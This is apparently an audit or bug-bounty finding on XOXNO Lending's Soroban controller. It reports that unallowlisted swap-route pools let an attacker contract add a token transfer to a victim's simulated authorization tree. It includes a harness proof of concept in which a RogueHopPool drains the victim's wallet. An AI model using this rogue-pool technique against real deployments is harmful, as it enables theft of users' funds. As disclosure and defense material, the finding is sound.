### Title
Unallowlisted route venues let a caller-supplied "pool" run attacker code inside the caller's signed auth tree and drain wallet tokens - (File: contracts/controller/src/strategies/swap.rs)

### Summary
The operadriver bug class is "a fetched/externally supplied executable is substituted with attacker-controlled code." In XOXNO Lending the analog is the swap route itself: the controller accepts raw `swap` bytes from any unprivileged caller in `swap_collateral`, `swap_debt`, `repay_debt_with_collateral` and `multiply`, forwards them verbatim to the swap aggregator, and the router invokes whatever pool/token contract addresses the payload names — there is no venue or pool allowlist. A crafted route substitutes an attacker-deployed contract for a real pool, and that contract executes inside the caller's authorization tree, where it can issue `token.transfer(caller, attacker, …)` calls that Soroban simulation silently records under the caller's `swap_collateral` root entry. A wallet that signs the simulated tree authorizes the theft of arbitrary tokens from the caller's wallet.

### Finding Description
`process_swap_collateral` only authenticates the caller (`require_authorized_caller`, `require_owner_or_delegate`) and then hands the caller-supplied `swap` blob to `withdraw_and_swap_from_supply` → `swap_tokens` [1](#0-0) . `swap_tokens` snapshots balances, grants the router exactly one input transfer via `authorize_transfer_as_current`, and calls `router.execute_strategy(controller, amount_in, swap)` [2](#0-1) . The balance checks (`RouterOverspend`, `NoSwapOutput`) only bound the controller's own balances; they place no restriction on which contracts the route invokes [3](#0-2) .

The aggregator decodes pool and token addresses from the payload's `assets` registry and calls them with no allowlist — the threat model states this explicitly: "The router calls the pool and token addresses its payload names and keeps no allowlist of them, so a route can put third-party code on the call stack below the caller's authorization… The loss is then the caller's wallet, not the routed amount, and neither the payload minimum nor the final risk gate bounds it" [4](#0-3) .

The harness proves the mechanics end-to-end: `RogueHopPool.swap` performs `token.transfer(alice → attacker, WALLET_BALANCE)`, simulation records that transfer as a child of Alice's `swap_collateral` root invocation, the signed "poisoned" tree executes the transfer, Alice's wallet is emptied and the attacker receives the full balance, while the protocol-leg `swap_collateral` completes normally (she even gets her fair ETH collateral output) [5](#0-4) [6](#0-5) .

### Impact Explanation
Theft of user funds. The stolen amount is not bounded by `amount_in`, the route's `min_out`, or the account risk checks — the rogue contract can pull every token the victim address holds (any Stellar asset contract whose `transfer` requires the victim's `require_auth`), because the theft rides on the root authorization the victim signs for the legitimate-looking strategy call. The poisoned child invocation is produced by `simulateTransaction` itself, so standard wallet/frontend flows that sign the simulated auth tree authorize it.

### Likelihood Explanation
Reachable by any unprivileged address: the attacker deploys a contract exposing a `swap`-like entrypoint, embeds its address as the hop pool in route XDR (the format is public), and has the route served to a victim via a malicious/compromised frontend or quote — precisely the MITM-substitution shape of the reference advisory. The victim-facing transaction looks like a normal `swap_collateral`/`repay_debt_with_collateral`/`multiply`/`swap_debt` call that succeeds and produces a plausible output, so detection relies on the user manually decoding the authorization tree, which clients do not do by default. The attack is documented in the project's own threat model as an unmitigated, client-side residual risk and confirmed by a dedicated harness test, so likelihood of real-world exploitation hinges on route provenance — non-trivial, hence High rather than Critical.

### Recommendation
Enforce a venue/pool allowlist at the trust boundary where user bytes become contract calls: either (a) the controller validates the decoded `StrategySwap` against a governance-maintained registry of approved pool addresses before `authorize_transfer_as_current`, or (b) the swap aggregator rejects hops whose `pool`/`token` addresses are not whitelisted by its owner. As a complementary control, the controller could require that routes for strategy entrypoints only reference hub-listed assets for `token_in`/`token_out`. At minimum, the recorded-auth-tree exposure should be surfaced in the integration docs so clients refuse trees with unexpected child invocations, per the threat model's own mitigation.

### Proof of Concept
Already implemented as a harness test — see `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`:

1. Deploy `UnlistedPoolRouter` stand-in (or the real router — the payload accepts any pool address) and `RogueHopPool` whose constructor stores `(victim, wallet_token, attacker, amount)`; its `swap` calls `token.transfer(victim, attacker, amount)` [7](#0-6) .
2. Alice has 10 000 USDC supplied and an unrelated `wallet_token` balance; the attacker crafts route XDR naming `RogueHopPool` as the hop pool with a fair `min_out`.
3. `simulateTransaction` on `controller.swap_collateral(alice, account_id, USDC, amount, ETH, route)` records the wallet-draining `transfer` as a child of Alice's root entry; the test asserts the recorded tree equals the poisoned tree and that Alice's wallet goes to 0 while the attacker receives `WALLET_BALANCE` [8](#0-7) .
4. With enforced auth, signing the honest root-only tree is refused by the host, but signing the simulation-produced tree executes the theft and the protocol swap still settles normally [9](#0-8) .

Caveat: this exposure is explicitly documented in `docs/explanation/threat-model.md` as an accepted residual risk with a client-side mitigation; whether that documentation excludes it under the "documented ADR choices" rule is a judgment call — the code path itself contains no enforceable bound on the loss.

### Citations

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-65)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );
```

**File:** contracts/controller/src/strategies/swap.rs (L30-38)
```rust
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-71)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L195-227)
```rust
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-269)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```
